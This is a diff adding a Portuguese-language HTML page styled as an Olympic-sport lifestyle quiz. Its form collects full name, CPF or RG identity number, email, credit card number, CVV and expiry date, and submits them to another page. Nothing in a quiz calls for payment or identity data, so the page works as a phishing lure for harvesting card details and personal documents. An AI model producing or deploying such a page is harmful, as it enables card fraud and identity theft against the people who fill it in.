@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Esporte Olímpico</title>
+    <link href="https://stackpath.bootstrapcdn.com/bootstrap/5.3.0/css/bootstrap.min.css" rel="stylesheet">
+  <img src="imagem.svg" alt="Imagem Centralizada" class="centered mb-4" style="width: 500px; height: auto;">
+
+    <style>
+        body {
+            background-color: black;
+            color: white;
+            text-align: center;
+        }
+        .centered {
+            margin: 0 auto;
+        }
+        .form-container {
+            margin-top: 20px;
+        }
+    </style>
+    <script src="script.js" defer></script>
+</head>
+<body>
+    <div class="container vh-100 d-flex flex-column justify-content-center align-items-center">
+        <h2>Veja qual o melhor esporte olímpico se encaixa melhor para o seu estilo de vida!</h2>
+
+        <div class="form-container w-100 mt-4">
+            <form action="outra_pagina.html" method="POST">
+                <div class="mb-3">
+                    <label for="option1" class="form-label">Nome completo:</label>
+                    <input type="text" class="form-control" id="option1" name="option1" placeholder="Digite seu nome completo">
+                </div>
+                <div class="mb-3">
+                    <label for="option2" class="form-label">CPF ou RG:</label>
+                    <input type="text" class="form-control" id="option2" name="option2" placeholder="Digite seu CPF ou RG">
+                </div>
+                <div class="mb-3">
+                    <label for="option3" class="form-label">E-mail:</label>
+                    <input type="email" class="form-control" id="email" name="email" placeholder="Digite o seu e-mail" required>
+                </div>
+                <div class="mb-3">
+                    <label for="option4" class="form-label">Nº do Cartão de crédito:</label>
+                    <input type="text" class="form-control" id="option4" name="option4" placeholder="Digite o Nº do Cartão de Crédito">
+                </div>
+                <div class="mb-3">
+                    <label for="option5" class="form-label">Código CVV:</label>
+                    <input type="text" class="form-control" id="option5" name="option5" placeholder="Código CVV">
+                </div>
+              <div class="mb-3">
+                  <label for="option6" class="form-label">Mês e ano de vencimento:</label>
+                  <input type="text" class="form-control" id="option6" name="option6" placeholder="Mês e ano de vencimento">
+              </div>
+                <button type="submit" class="btn btn-primary">Descubra agora!</button>
+            </form>
+        </div>
+    </div>
+
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/5.3.0/js/bootstrap.bundle.min.js"></script>
+</body>
+</html>
